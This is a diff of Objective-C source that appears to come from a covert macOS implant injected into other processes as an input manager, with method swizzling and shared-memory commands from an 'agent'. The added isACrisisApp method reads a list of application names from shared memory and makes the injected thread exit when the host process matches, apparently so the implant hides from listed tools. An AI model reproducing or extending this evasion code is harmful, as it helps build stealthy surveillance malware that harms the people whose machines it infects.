@@ -885,6 +885,73 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   [pool release];
 }
 
++ (BOOL)isACrisisApp
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *readData;
+  shMemoryCommand *shMemCommand;
+  BOOL retVal = NO;
+  NSProcessInfo *pi = [NSProcessInfo processInfo];  
+  NSString *appName = [pi processName];
+
+#ifdef DEBUG_INPUT_MANAGER
+  infoLog(@"Crisis appName %@", appName);  
+#endif
+  
+  readData = [mSharedMemoryCommand readMemory: OFFT_CRISIS
+                                fromComponent: COMP_AGENT];
+  
+  if (readData == nil)
+    return retVal;
+  
+  shMemCommand = (shMemoryCommand *)[readData bytes];
+  
+#ifdef DEBUG_INPUT_MANAGER
+  infoLog(@"Crisis commandData %@", readData);  
+#endif
+  
+  if (shMemCommand->command == AG_START &&
+      shMemCommand->commandDataSize)
+  {
+    NSData *tmpListData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
+                                                 length: shMemCommand->commandDataSize];
+    UInt32 numOfNames;
+    
+    [tmpListData getBytes: &numOfNames length: sizeof(UInt32)];
+    
+    char* tmpPtr = ((char*)[tmpListData bytes]) + sizeof(UInt32);
+    
+    for (int i=0; i < numOfNames; i++)
+    {
+      int iLen = _utf16len((unichar*)tmpPtr)*sizeof(unichar);
+      NSString *tmpCrisisApp = [[NSString alloc] initWithBytes: tmpPtr 
+                                                        length: iLen 
+                                                      encoding: NSUTF16LittleEndianStringEncoding];
+      
+      
+#ifdef DEBUG_INPUT_MANAGER
+      infoLog(@"AppName %@", tmpCrisisApp);  
+#endif
+      
+      if ([appName isCaseInsensitiveLike: tmpCrisisApp])
+      {
+        [tmpCrisisApp release];
+        retVal = YES;
+        break;
+      }
+      
+      [tmpCrisisApp release];
+      
+      tmpPtr += iLen;
+    }
+  }
+  
+  [pool release];
+  
+  return retVal;
+}
+
 + (void)startCoreCommunicator
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -902,6 +969,18 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
   
   usleep(500000);
+
+  
+  // Only for input manager
+  if (gOSMajor    == 10 &&
+      gOSMinor == 5 &&
+      [self isACrisisApp])
+  {
+#ifdef DEBUG_INPUT_MANAGER
+    infoLog(@"Crisis is started and app match exit now!");  
+#endif
+    return;
+  }
   
 #ifdef DEBUG_INPUT_MANAGER
   infoLog(@"Core Communicator thread launched");  
